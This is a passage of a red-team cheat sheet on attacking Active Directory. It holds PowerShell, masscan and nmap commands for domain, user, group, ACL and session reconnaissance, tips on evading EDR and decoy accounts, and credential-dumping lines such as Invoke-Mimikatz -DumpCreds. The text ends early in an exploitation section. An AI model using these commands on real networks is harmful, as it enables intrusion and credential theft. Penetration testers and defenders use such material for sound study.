<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Offensive Active Directory - readloud.org</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Offensive Active Directory", url: "#_top", children: [
          ]},
          {title: "Tools", url: "#tools", children: [
          ]},
          {title: "Domain Recon", url: "#domain-recon", children: [
              {title: "To Query Active Directory", url: "#to-query-active-directory" },
              {title: "Domain Enumeration", url: "#domain-enumeration" },
              {title: "Domain Recon", url: "#domain-recon_1" },
          ]},
          {title: "* Enumerate usernames", url: "#enumerate-usernames", children: [
          ]},
          {title: "* enum4linux", url: "#enum4linux", children: [
          ]},
          {title: "* Extract machine usernames (user\\$) from above", url: "#extract-machine-usernames-user-from-above", children: [
          ]},
          {title: "* Masscan all \"user\\$.domain_name\" for open ports", url: "#masscan-all-userdomain_name-for-open-ports", children: [
          ]},
          {title: "* Nmap all \"user\\$.domain_name\" for open ports", url: "#nmap-all-userdomain_name-for-open-ports", children: [
              {title: "Get Default Domain Policies", url: "#get-default-domain-policies" },
              {title: "Find Domain Controllers", url: "#find-domain-controllers" },
          ]},
          {title: "Trust Enumeration", url: "#trust-enumeration", children: [
          ]},
          {title: "User Recon", url: "#user-recon", children: [
          ]},
          {title: "Computer Recon", url: "#computer-recon", children: [
          ]},
          {title: "Groups Recon", url: "#groups-recon", children: [
          ]},
          {title: "Memership Recon", url: "#memership-recon", children: [
          ]},
          {title: "Group Policy Recon", url: "#group-policy-recon", children: [
              {title: "Check policy from the server itself", url: "#check-policy-from-the-server-itself" },
          ]},
          {title: "OU Recon", url: "#ou-recon", children: [
          ]},
          {title: "Special Target Recon", url: "#special-target-recon", children: [
              {title: "Remote Registry and Local Administrator rights - PowerView", url: "#remote-registry-and-local-administrator-rights-powerview" },
              {title: "Find Servers with Shares", url: "#find-servers-with-shares" },
              {title: "Get High-Value Target where multiple people login like file server", url: "#get-high-value-target-where-multiple-people-login-like-file-server" },
              {title: "User Hunting", url: "#user-hunting" },
              {title: "This invokes Get-NetComputer and uses Invoke-CheckLocalAdminAccess", url: "#this-invokes-get-netcomputer-and-uses-invoke-checklocaladminaccess" },
              {title: "This Looks for Domain Admin Sessions - Short Path", url: "#this-looks-for-domain-admin-sessions-short-path" },
          ]},
          {title: "Domain ACL Enumeration", url: "#domain-acl-enumeration", children: [
              {title: "SQL Server Recon", url: "#sql-server-recon" },
          ]},
          {title: "Exploitation", url: "#exploitation", children: [
              {title: "PowerShell basics", url: "#powershell-basics" },
              {title: "Enable PS Remoting", url: "#enable-ps-remoting" },
              {title: "Privilege Escalation - Local Admin", url: "#privilege-escalation-local-admin" },
              {title: "Reigstry Backdoors", url: "#reigstry-backdoors" },
              {title: "Memory dump LOLBAS", url: "#memory-dump-lolbas" },
              {title: "Download a Program", url: "#download-a-program" },
              {title: "Query Sessions", url: "#query-sessions" },
              {title: "View passwords in cleartext", url: "#view-passwords-in-cleartext" },
              {title: "RDP without password", url: "#rdp-without-password" },
              {title: "Gain foothold", url: "#gain-foothold" },
              {title: "ASEPRoast", url: "#aseproast" },
              {title: "Unconstrained Delegation", url: "#unconstrained-delegation" },
              {title: "msDS-AllowedToDelegateTo", url: "#msds-allowedtodelegateto" },
              {title: "Trusts", url: "#trusts" },
              {title: "Mimikatz", url: "#mimikatz" },
              {title: "Priv Escalation - AD", url: "#priv-escalation-ad" },
              {title: "HeidiSQL Portable", url: "#heidisql-portable" },
          ]},
          {title: "Persistence", url: "#persistence", children: [
              {title: "Golden Ticket", url: "#golden-ticket" },
              {title: "WMI", url: "#wmi" },
              {title: "AdminSDHolder", url: "#adminsdholder" },
              {title: "SID History", url: "#sid-history" },
              {title: "Enable DSRM Admin Login", url: "#enable-dsrm-admin-login" },
          ]},
          {title: "ACE Format", url: "#ace-format", children: [
          ]},
          {title: "Protection", url: "#protection", children: [
              {title: "Golden Ticket", url: "#golden-ticket_1" },
              {title: "Silver Ticket", url: "#silver-ticket" },
              {title: "Skeleton Key", url: "#skeleton-key" },
              {title: "DSRM Admin Logon Detection", url: "#dsrm-admin-logon-detection" },
              {title: "Kerberoasting", url: "#kerberoasting" },
              {title: "Delegation defenses", url: "#delegation-defenses" },
              {title: "ACL Attacks", url: "#acl-attacks" },
              {title: "SIDFiltering", url: "#sidfiltering" },
              {title: "ATA", url: "#ata" },
              {title: "LAPS", url: "#laps" },
              {title: "Credential Guard", url: "#credential-guard" },
              {title: "Protected Users Group", url: "#protected-users-group" },
              {title: "Privileged Administrative Worksatations (PAWs)", url: "#privileged-administrative-worksatations-paws" },
              {title: "AD Security Model", url: "#ad-security-model" },
          ]},
          {title: "* Control Restrictions - What admins control", url: "#control-restrictions-what-admins-control", children: [
          ]},
          {title: "* Logon Restrictions - Where admins can log-on to", url: "#logon-restrictions-where-admins-can-log-on-to", children: [
          ]},
          {title: "* Enhanced Security Admin Environment", url: "#enhanced-security-admin-environment", children: [
              {title: "Forest - a security boundary", url: "#forest-a-security-boundary" },
              {title: "PowerShell version 5", url: "#powershell-version-5" },
          ]},
          {title: "Deception", url: "#deception", children: [
          ]},
          {title: "References", url: "#references", children: [
          ]},
          {title: "* Wiki", url: "#wiki", children: [
          ]},
          {title: "* DCShadow", url: "#dcshadow", children: [
          ]},
          {title: "* BloodHound", url: "#bloodhound", children: [
          ]},
          {title: "* CrackMapExec", url: "#crackmapexec", children: [
          ]},
          {title: "* EmPyre", url: "#empyre", children: [
          ]},
          {title: "* Red Teaming AD (PDF)", url: "#red-teaming-ad-pdf", children: [
          ]},
          {title: "* Attack Methods - Domain Admin", url: "#attack-methods-domain-admin", children: [
          ]},
          {title: "* Attacking Domain Trusts", url: "#attacking-domain-trusts", children: [
          ]},
          {title: "* Misc Tools/Scripts", url: "#misc-toolsscripts", children: [
          ]},
          {title: "* Protocol Info", url: "#protocol-info", children: [
          ]},
          {title: "* Attacking Kerberos", url: "#attacking-kerberos", children: [
          ]},
          {title: "* Attack Kerberos w/o Mimikatz", url: "#attack-kerberos-wo-mimikatz", children: [
          ]},
          {title: "* Roasting AS-REPS", url: "#roasting-as-reps", children: [
          ]},
          {title: "* Kerberos Party Tricks", url: "#kerberos-party-tricks", children: [
          ]},
          {title: "* AD Persistence", url: "#ad-persistence", children: [
          ]},
          {title: "* Responder", url: "#responder", children: [
          ]},
          {title: "* Metasploit", url: "#metasploit", children: [
          ]},
          {title: "* CPasswords", url: "#cpasswords", children: [
          ]},
          {title: "* Detailed Group Policy Information", url: "#detailed-group-policy-information", children: [
          ]},
          {title: "* Windows", url: "#windows", children: [
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="offensive-active-directory">Offensive Active Directory</h1>
<blockquote>
<p>Designed to be a used in a red team assesment and contains commands, tools and methods with which anyone can attack and defend active directory. </p>
</blockquote>
<h1 id="tools">Tools</h1>
<ul>
<li><a href="https://github.com/samratashok/ADModule">ADModule - Nikhil Mittal</a></li>
<li><a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/">ADModule Microsoft Reference</a></li>
<li>To audit GPO, use <a href="https://github.com/l0ss/Grouper2">Grouper2</a></li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a></li>
<li><a href="https://github.com/vletoux/pingcastle">PingCastle</a></li>
<li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></li>
<li><a href="https://github.com/adrecon/ADRecon">AD Recon</a></li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">AD Explorer</a></li>
<li><a href="https://github.com/p0w3rsh3ll/NetCease">NetCease</a></li>
<li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
<li><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a></li>
<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></li>
<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
<li><a href="https://github.com/ropnop/kerbrute">Kerbrute</a></li>
<li><a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a></li>
</ul>
<h1 id="domain-recon">Domain Recon</h1>
<h2 id="to-query-active-directory">To Query Active Directory</h2>
<ul>
<li>[ADSI]</li>
<li>System.DirectoryServices.ActiveDirectory </li>
<li>Powershell AD Module</li>
<li>PowerView<ul>
<li>When using PowerView beware of AVs / EDR you can use SharpView or modify it for own use.</li>
</ul>
</li>
<li>Bloodhound <ul>
<li>These days many environments have deception solutions / Microsoft ATA or similar software that detect bloodhoound data collection. Be careful when you use this.</li>
</ul>
</li>
</ul>
<h2 id="domain-enumeration">Domain Enumeration</h2>
<ul>
<li>Gets you the domain name
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>$ADClass::GetCurrentDomain()
</span></code></pre></div></li>
</ul>
<h2 id="domain-recon_1">Domain Recon</h2>
<ul>
<li>Gets you the domain information</li>
<li>ADModule
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Get-ADDomain
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Get-ADDomain -Identity security.local
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>(Get-ADDomain).DomainSID
</span></code></pre></div></li>
</ul>
<h1 id="enumerate-usernames">* Enumerate usernames</h1>
<ul>
<li>https://github.com/skorov/ridrelay</li>
</ul>
<h1 id="enum4linux">* enum4linux</h1>
<ul>
<li>https://highon.coffee/blog/enum4linux-cheat-sheet/</li>
</ul>
<h1 id="extract-machine-usernames-user-from-above">* Extract machine usernames (user\$) from above</h1>
<h1 id="masscan-all-userdomain_name-for-open-ports">* Masscan all "user\$.domain_name" for open ports</h1>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>masscan --rate 100000 -e eth0 --ports&amp;lt;port range&amp;gt; --open-only &amp;lt;SCAN RANGE&amp;gt;
</span></code></pre></div>
- Common ports: 21, 22, 23, 25, 53, 80, 443, 445, 3389, etc</p>
<ul>
<li>Reference: https://github.com/robertdavidgraham/masscan</li>
</ul>
<h1 id="nmap-all-userdomain_name-for-open-ports">* Nmap all "user\$.domain_name" for open ports</h1>
<ul>
<li>
<p>Nmap all "user\$.domain_name" for open ports/services</p>
</li>
<li>
<p>Tuned Nmap</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nmap -Pn -n -A -T4 --top-ports=1000 --max-rtt-timeouts=500ms --initial-rtt-timeout=200ms --min-rtt-timeout=2--ms --open --stats-every 5s &amp;lt;IP/Range&amp;gt;
</span></code></pre></div>
</li>
</ul>
<h2 id="get-default-domain-policies">Get Default Domain Policies</h2>
<ul>
<li>Gets you the domain policies related to kerberos </li>
<li>PowerView
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Get-DomainPolicy
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>(Get-DomainPolicy).&quot;System Access&quot;
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>(Get-DomainPolicy).&quot;Kerberos Policy&quot;
</span></code></pre></div></li>
</ul>
<h2 id="find-domain-controllers">Find Domain Controllers</h2>
<ul>
<li>Gets the Domain Controller you are connected to</li>
<li>AD Module
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>Get-ADDomainController
</span></code></pre></div></li>
</ul>
<h1 id="trust-enumeration">Trust Enumeration</h1>
<ul>
<li>Powerview
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>Get-NetDomainTrust
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Get-NetDomainTrust -Domain security.local
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>Get-NetForestTrust
</span></code></pre></div></li>
<li>AD Module
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Get-ADForest
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>Get-ADForest -Identity security.local
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>(Get-ADForest).Domains
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>Get-ADTrust -Filter &#39;msDS-TrustForestTrustInfo -ne &quot;$null&quot;&#39;
</span></code></pre></div></li>
</ul>
<h1 id="user-recon">User Recon</h1>
<ul>
<li>
<p>AD Module
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Get-ADUser -Filter * -Properties *
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Get-ADUser -Identity domainAdmin -Properties *
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>Get-ADUser -Server DC.security.local
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberName *Properties | select name
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
</span></code></pre></div></p>
</li>
<li>
<p>Look at logoncount, badpwdcount, pwdlastset find real users and dodge fake and decoy users.</p>
</li>
<li>AD Module
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Get-ADUser -Filter &#39;If you have a filter&#39; -Properties Description | select name,Description | Export-CSV &quot;Description.csv&quot;
</span></code></pre></div></li>
<li>This will generate a 4662, which you can look for with the command
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>(Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4662} | 
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>Select-Object -Property Category,Index,TimeGenerated,
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>EntryType,Source,InstanceID,Message) -match &quot;domainAdminn&quot; | Format-Table -AutoSize
</span></code></pre></div></li>
</ul>
<h1 id="computer-recon">Computer Recon</h1>
<ul>
<li>AD Module
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Get-ADComputer -Filter * -Properties *
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Get-ADComputer -Filter * | select name
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>Get-ADComputer -Filter &#39;OperatingSystem -like &quot;*Server 2016*&quot;&#39; -Properties OperatingSystem | select name,OperatingSystem
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
</span></code></pre></div></li>
</ul>
<h1 id="groups-recon">Groups Recon</h1>
<ul>
<li>AD Module
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>Get-ADGroup -Filter * | select name 
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>Get-ADGroup -Filter * -Properties *
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>Get-ADGroup -Filter &#39;Name -like &quot;*admin*&quot;&#39; | select Name
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>Get-ADGroupMember -Identity &#39;Administrators&#39; -Recursive -Server &lt;&gt; | % {Get-ADUser $_ -prop ServicePrincipalName} | Where {$_.ServicePrincipalName}
</span></code></pre></div></li>
<li>Key Admins and Enterprise Key Admins introduced from Windows Server 2016</li>
</ul>
<h1 id="memership-recon">Memership Recon</h1>
<ul>
<li>Look for IsGroup - Groupception i.e. where groups are a part of groups.</li>
<li>Built-in admins renaming is useless as it will have 500 as SID ending. Use this technique if you can't find the built-in administratrator by name.</li>
<li>Recursive gets the details of sub existing groups as well</li>
<li>AD Module</li>
</ul>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Get-ADGroupMember -Identity &quot;Domain Admins&quot; -Recursive
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>Get-ADPrincipalGroupMembership -Identity domainAdmin
</span></code></pre></div>
- Powersploit
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>Get-NetGroupMember -GroupName &#39;*Admin&#39; -Domain security.local | Select-Object MemberName
</span></code></pre></div></p>
<ul>
<li>Filter based script
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>$Groups = Get-ADGroup -Filter * -SearchBase &quot;OU=confidential,DC=security,DC=local&quot;
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>$Members = foreach ($Group in $Groups)
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>{
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>    Get-ADGroupMember -Identity $Group |
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>    Where-Object objectClass -eq &#39;Group&#39; |
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>    Select-Object Name,SamAccountName
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>}
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>Write-Output $Members
</span></code></pre></div></li>
</ul>
<h1 id="group-policy-recon">Group Policy Recon</h1>
<ul>
<li>AD Module
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>Get-GPO -All
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>Get-GPResultatnSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html
</span></code></pre></div></li>
<li>PowerView
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Get-NetGPO | select dispalyname
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>Get-NetGPO -ComputerName &lt;&gt;
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>Get-NetGPOGroup
</span></code></pre></div></li>
</ul>
<h2 id="check-policy-from-the-server-itself">Check policy from the server itself</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>gpresult /R /V
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Find-GPOComputerAdmin -Computername &lt;&gt;
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>Find-GPOLocation -UserName domainAdmin -Verbose
</span></code></pre></div>
<h1 id="ou-recon">OU Recon</h1>
<ul>
<li>
<p>PowerView
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>Get-NetOU -FullData
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>Get-NetOU -GPOname &quot;{GUID}&quot;
</span></code></pre></div></p>
</li>
<li>
<p>AD Module
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>Get-ADOrganizatioalUnit -Filter * -Properties *
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>Get-GPO -Guid {GUID}
</span></code></pre></div></p>
</li>
</ul>
<h1 id="special-target-recon">Special Target Recon</h1>
<h2 id="remote-registry-and-local-administrator-rights-powerview">Remote Registry and Local Administrator rights - PowerView</h2>
<ul>
<li>PowerView</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>Get-NetLoggedon -ComputerName 
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>Get-LoggedonLocal -ComputerName 
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>Get-LastLoggedOn -ComputerName
</span></code></pre></div>
<h2 id="find-servers-with-shares">Find Servers with Shares</h2>
<ul>
<li>PowerView</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>Invoke-ShareFinder -Verbose
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>Invoke-FileFinder -Verbose
</span></code></pre></div>
<h2 id="get-high-value-target-where-multiple-people-login-like-file-server">Get High-Value Target where multiple people login like file server</h2>
<ul>
<li>PowerView
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>Get-NetFileServer
</span></code></pre></div></li>
</ul>
<h2 id="user-hunting">User Hunting</h2>
<ul>
<li>PowerView
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>Find-LocalAdminAccess -Verbose
</span></code></pre></div></li>
</ul>
<h2 id="this-invokes-get-netcomputer-and-uses-invoke-checklocaladminaccess">This invokes Get-NetComputer and uses Invoke-CheckLocalAdminAccess</h2>
<ul>
<li>PowerView</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>Find-WMILocalAdminAccess.ps1
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>Invoke-EnumerateLocalAdmin -Verbose
</span></code></pre></div>
<h2 id="this-looks-for-domain-admin-sessions-short-path">This Looks for Domain Admin Sessions - Short Path</h2>
<ul>
<li>PowerView
<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>Invoke-UserHunter
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>Invoke-UserHunter -GroupName &quot;RDPUsers&quot;
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>Invoke-UserHunter -CheckAccess
</span></code></pre></div></li>
</ul>
<h1 id="domain-acl-enumeration">Domain ACL Enumeration</h1>
<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>Get-ObjectAcl -ADSprefix &#39;CN=Administrator,CN=Users&#39; -Verbose
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>(Get-Acl &#39;AD:\CN=Administrator,CN=Users,DC=security,DC=local&#39;).Access
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>Get-ObjectAcl -ADSpath &quot;LDAP://&quot; -ResolveGUIs -Verbose
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>Invoke-ACLScanner -ResolveGUIDs
</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>Get-PathAcl -Path &quot;\\security.local\sysvol&quot;
</span></code></pre></div>
<h2 id="sql-server-recon">SQL Server Recon</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>Get-SQLInstanceDomain
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>Get-SQLConnectionTestThreaded
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>Get-SQLServerLink
</span></code></pre></div>
<h1 id="exploitation">Exploitation</h1>
<h2 id="powershell-basics">PowerShell basics</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>start powershell -credential &quot;&quot;
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>Enter-PSSession -ComputerName COMPUTER -Credential USER
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>Invoke-Command -ComputerName &lt;&gt; -ScriptBlock ${function:hello}
</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>ls function:
</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName &lt;&gt; 
</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>Invoke-Mimikatz -DumpCreds -ComputerName
</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>Exit-PSSession
</span></code></pre></div>
<h2 id="enable-ps-remoting">Enable PS Remoting</h2>
<ul>
<li>wsmprovhost is executed on a client computer when running PSRemoting</li>
<li>PSExec
